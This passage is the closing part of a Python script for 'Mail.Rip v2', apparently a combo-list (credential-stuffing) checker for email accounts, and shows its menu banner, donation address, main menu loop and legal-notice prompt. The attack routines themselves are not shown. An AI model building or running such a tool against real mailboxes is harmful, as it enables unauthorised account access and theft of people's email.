                                ltc = LeJsHzcMixhvR1qEfgHJU32joVAJDgQwR7
            ____________________________________________________________
            
                             -+==> [ MAIN MENU ] <==+-
            
            [1] SET DEFAULT VALUES        [2] DE-/ACTIVATE PROXY-SUPPORT
            [3] LOAD COMBOS               [4] START ATTACK
            
                                          [0] EXIT MAIL.RIP V2
            
            #####################################################[v2|R3]

'''

# [*** MAIN ***]
# --------------------------------------------------------------------------------------------------------------------
def mainmenu():
    '''
    The main menu.

    :return: None
    '''
    # show logo on a clean screen:
    clean()
    print(colorama.Fore.RED + main_logo)
    option = input('Choose an option, please:    ' + colorama.Fore.YELLOW)
    # option 0 exits Mail.Rip v2:
    if option == '0':
        clean()
        sys.exit(colorama.Fore.RED + '\n\nClosing Mail.Rip v2 ...\nSee you again!')
    # option 1 for setting up default values:
    elif option == '1':
        status_msg = setdefaults()
        if status_msg == True:
            input(colorama.Fore.GREEN + '\n\nSUCCESS\n' + '_'*90 + '\nDefault values have been changed.'
                  + '\nPress [ENTER] to return to main menu')
        else:
            input(colorama.Fore.RED + '\n\nERROR\n' + '_'*90 + '\nDefault values have not been changed.'
                  + '\nPress [ENTER] to return to main menu')
        return None
    # option 2 for setting up proxy-support:
    elif option == '2':
        status_msg = proxysupport()
        if status_msg == True:
            input(colorama.Fore.GREEN + '\n\nSUCCESS\n' + '_'*90
                  + f'\nProxy-support is activated using {str(type_socks)} proxys.'
                  + '\nPress [ENTER] to return to main menu')
        else:
            input(colorama.Fore.RED + '\n\nERROR\n' + '_'*90 + '\nProxy-support is deactivated.'
                  + '\nPress [ENTER] to return to main menu')
        return None
    # option 3 for loading combos for an attack:
    elif option == '3':
        status_msg = comboloader()
        if status_msg == True:
            input(colorama.Fore.GREEN + '\n\nSUCCESS\n' + '_'*90
                  + f'\nCombos successfully loaded. Amount: {str(len(combos))}'
                  + '\nPress [ENTER] to return to main menu.')
        else:
            input(colorama.Fore.RED + '\n\nERROR\n' + '_'*90 + '\nLoading combos failed.'
                  + '\nPress [ENTER] to return to main menu.')
        return None
    # option 4 for starting an attack:
    elif option == '4':
        startattack()
        clean()
        input(colorama.Fore.YELLOW + '\n\nINFO\n' + '_'*90
              + f'\nFinishing the attack... Hits: {str(hits)}, fails: {str(fails)}'
              + '\nPress [ENTER] to return to main menu')
        return None
    # any other input restarts the mainmenu function:
    else:
        clean()
        input(colorama.Fore.YELLOW + 'INFO\n' + '_'*90 + '\nNo option entered.'
              +'\nPress [ENTER] to return to main menu')
        return None

clean()
# on startup, show "legal notices" logo first and wait for user confirmation:
print(colorama.Fore.RED + legal_logo)
legal_confirm = str(input('CONFIRM THE LEGAL NOTICES WITH [ENTER] TO START MAIL.RIP V2 OR TYPE "NO":    '))
# if user says no, exit Mail.Rip v2:
if legal_confirm == 'NO' or legal_confirm == 'no' or legal_confirm == 'n':
    clean()
    sys.exit(colorama.Fore.RED
             + '\nLegal Notices not confirmed.\nMail.Rip v2 cannot be run without confirming the '
             + 'Legal Notices.\n\n')
else:
    pass
# after confirmation start main menu:
while True:
    mainmenu()

# DrPython3 (C) 2021 @ GitHub.com
